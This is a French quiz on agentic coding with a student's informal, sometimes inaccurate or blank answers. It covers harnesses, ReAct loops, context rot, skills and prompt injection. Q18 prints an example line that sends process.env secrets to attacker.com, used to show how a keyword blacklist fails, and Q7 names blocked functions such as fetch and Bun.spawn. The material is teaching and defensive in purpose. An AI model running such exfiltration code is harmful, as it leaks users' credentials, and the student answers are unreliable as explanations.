Quiz

Q1. Un LLM est souvent décrit comme "stateless". Qu'est-ce que ça veut dire concrètement ? Donnez deux conséquences directes sur la conception d'un agent.

sa veut dire qu'il n'a pas de mémoire par exemple
sa a pour conséquence de devoir lui rappeller les messages d'avant

Q2. Vous envoyez le même prompt à petit modèle comme Haiku et à un grand modèle comme Opus. Haiku répond en 400ms pour $0.002, Opus en 3s pour $0.10. La réponse d'Opus est légèrement meilleure. Dans quels cas choisissez-vous Haiku malgré tout ?

Dans le cas ou les operations demander demande pas beaucoup de ressource

Q3. Quelle est la différence entre le vibe coding et l'agentic coding ?
Harness et boucle agentique

le vibe coding c'est le fait de faire un prompt avoir une reponse
et l'agentic coding c que l'ia est autonome il gère tout seul

Q4. Faite une schéma ou décrivez en texte le cycle complet d'un tour de boucle ReAct. Partez du moment où le LLM produit une réponse, jusqu'au moment où il reçoit le résultat de l'outil.

il récupère la demande il compare au outil disponible il trouve le meilleur outil pour le faire et ensuite avec son resultat il reboucle dessus jusqu'a avoir le résultat attendu

Q5. Certains avaient oublié d'inclure tool_calls dans le message assistant lors du J1. Expliquez précisément pourquoi ça casse la boucle, qu'est-ce que le modèle ne sait plus faire sans cette information ?

il ne sait pas comment appeler le tool il sait qu'il existe mais il ne sait pas par ou l'appeller

Q6. Votre harness a une limite de 15 tours. Que se passe-t-il si une mission nécessite 20 tours ? Proposez deux stratégies pour gérer ça proprement sans juste augmenter le nombre.

on change le prompt systeme en lui passant le nombre de tour restant pour qu'il essaye de trouver un moyen plus rapide ou on lui retourne un message d'erreur

Q7. Votre outil run_js avait une blacklist de mots interdits (fetch, Bun.spawn, etc.). Pourquoi cette approche est-elle insuffisante en production ? Quelle alternative serait plus robuste ?
Context engineering

la meilleur alternative serait de faire une vm comme fait sur ce projet dans pdfWriter cela permet d'isoler l'environnement d'execution de la machine

Q8. Définissez le "context rot" en une phrase. Donnez un exemple concret qui s'est produit (ou aurait pu se produire) dans votre harness pendant le workshop.

c que il commence a oublier certaine information par exemple au debut on lui dit de return que du json mais a partir d'une certaine quandtité de donner il l'oublie

Q9. Vous avez un harness qui tourne une mission longue : 12 tours, chaque tour injecte 3000 tokens de résultats d'outils. Estimez le contexte total à la fin. Que proposez-vous pour rester sous 32 000 tokens sans perdre d'information critique ?

12\*3000 = 36000 token pour ne pas perdre tout c token on peut refaire faire un tour de boucle pour garder toute les information mais que l'ia fasse un réssumer car il doit y avoir des information en double

Q10. Quelle est la différence entre just-in-time loading et compaction ? Donnez un cas d'usage concret pour chacun.

compacting c le fait de condensé les informations comme dis juste au dessus si le contexte risque deborder on peut conpacting

Q11. Quelqu'un vous dit : "Mon AGENTS.md fait 800 lignes, j'ai tout documenté." Qu'est-ce que vous lui répondez ?
Skills

qu'il est certainement trop long et que il va y avoir un probleme de contexte mais c une super chose de l'avoir documenté

Q12. Expliquez la différence entre un skill et un system prompt classique. En quoi le fait que le skill soit chargé "à la demande" change-t-il quelque chose ?

un skill permet de lui donner des instruction de comment répondre et un prompt classique il te repondra mais peut etre avec trop ou pas de détail un skill permet de le rendre plus expert dans un context et un domaine

Q13. Vous créez un skill code-review. Votre collègue crée un skill software-quality. Ils couvrent des missions très similaires. Quel problème ça crée dans le harness ? Comment le résoudre ?

le harness peut utiliser les deux donc il peux y avoir donc un conflic pour cela on peut dire au harness de selectionner celui qui couvre toute les partie

Q14. La description dans le frontmatter d'un SKILL.md a des "Triggers" et des "Ne PAS utiliser pour". Pourquoi les deux sont-ils nécessaires ? Que se passe-t-il si vous n'avez que les triggers ?

les triggers sa lui dit quand l'utiliser mais y a aussi des moment ou il ne faut pas le use dans a ce moment les triggers sont pratique

Q15. Donnez un exemple de skill qui serait inutile : c'est-à-dire une situation où mettre l'information dans le system prompt permanent serait meilleur qu'un skill dynamique.
Sécurité et prompt injection

Q16. Expliquez le prompt injection en une analogie simple, comme si vous l'expliquiez à quelqu'un qui ne code pas.

c quuand quelqu'un externe infecte des donner dans le prompt

Q17. Dans l'exercice 3, vous avez protégé le champ text avec inputGuard(). Mais le champ lang allait directement dans le system prompt sans validation. Écrivez la ligne de code qui aurait corrigé ça.

Q18. Votre harness utilise run_js pour exécuter du code généré par le LLM. Un utilisateur malveillant envoie une mission qui amène le LLM à générer ce code :

const res = await fetch("https://attacker.com?data=" + JSON.stringify(process.env));

La blacklist ne contient pas process.env. Que se passe-t-il ? Comment l'empêcher structurellement ?
Vision d'ensemble

solution simple on peut l'executer dans une vm ce qui permet d'isoler l'environement

Q19. Vous devez choisir un modèle pour chaque tâche suivante. Justifiez chaque choix en une phrase :

    Autocomplétion de code dans l'IDE (latence critique)

    llama 7b une latence très faible

    Analyse de sécurité d'une codebase de 50 fichiers

    claude sonnet model puissant avec une bonne mémoire

    Résumé de 200 articles RSS par jour

    GPT-4o-mini petit modele avec faible cout comme beaucoup de donnée a traité

    Raisonnement sur une architecture système complexe

    Claude Opus puissant avec une bonne gestion du raisonnement

Q20. Qu'est-ce qui vous semble le plus difficile à maîtriser dans l'agentic coding, pas techniquement, mais conceptuellement ?

le plus compliquer a mes yeux est de generer des systemePrompt ou des skill car malgrès des regle strict il peut passé a coté donc difficile a comprendre

Q21. Expliquez en 3 phrahse à un développeur qui "utilise juste Claude" pourquoi s'intéresser aux harness.

Un harness permet d'ajouté des outils a un llm
C comme utilisé un pistolet a eau contre un incendie
ne pas avoir d'harness tu utilise le llm sans d'outil
